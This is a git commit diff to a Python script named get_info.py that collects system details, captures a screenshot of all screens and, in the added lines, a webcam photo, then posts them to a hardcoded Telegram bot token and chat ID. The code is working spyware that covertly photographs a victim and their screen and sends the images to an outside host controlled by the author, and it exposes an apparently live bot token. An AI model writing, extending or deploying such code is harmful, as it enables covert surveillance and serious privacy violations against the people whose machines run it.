ccd51659c7076caa73e7b2de6985951241adcaba
Тот самый <151750492+tot-camiy-coder@users.noreply.github.com>
2024-11-16 16:09:28 +0300

    Update get_info.py

--- get_info.py
+++ get_info.py
@@ -10,12 +10,22 @@ import platform
 import cpuinfo
 import socket
 import requests
-from PIL import ImageGrab
+from PIL import ImageGrab, Image
 import io
+import json
+import cv2
 
 def ScreenGrab():
     img = ImageGrab.grab(all_screens=True)
     buf = io.BytesIO(); img.save(buf, format='PNG'); buf.seek(0)
+    return buf
+
+def WebcamGrab():
+    cap = cv2.VideoCapture(0)
+    _, frame = cap.read()
+    cap.release()
+    img = Image.fromarray(cv2.cvtColor(frame, cv2.COLOR_BGR2RGB))
+    buf = io.BytesIO(); img.save(buf, format="PNG"); buf.seek(0)
     return buf
 
 def GetIP():
@@ -42,9 +52,18 @@ def GetSystem():
 if __name__ == '__main__':
     info = GetSystem()
     desktop = ScreenGrab()
+    webcam = WebcamGrab()
 
     TOKEN = "7539990102:AAFCEwvXc2yzf-FUD-UD8vH_uHM1Vfoo_NA"
     CHAT_ID = 1320559926
 
     # send
-    requests.post(f'https://api.telegram.org/bot{TOKEN}/sendPhoto', data={'chat_id': CHAT_ID, 'caption': info}, files={'photo': desktop})
+    r= requests.post(f'https://api.telegram.org/bot{TOKEN}/sendMediaGroup', 
+                  data={'chat_id': CHAT_ID, 'caption': info,'media': json.dumps([
+                        {'type': 'photo', 'media': 'attach://desktop'}, 
+                        {'type': 'photo', 'media': 'attach://webcam', 'caption': info}
+                      ])}, 
+                  files={
+                      'desktop': desktop,
+                      'webcam': webcam
+                  })
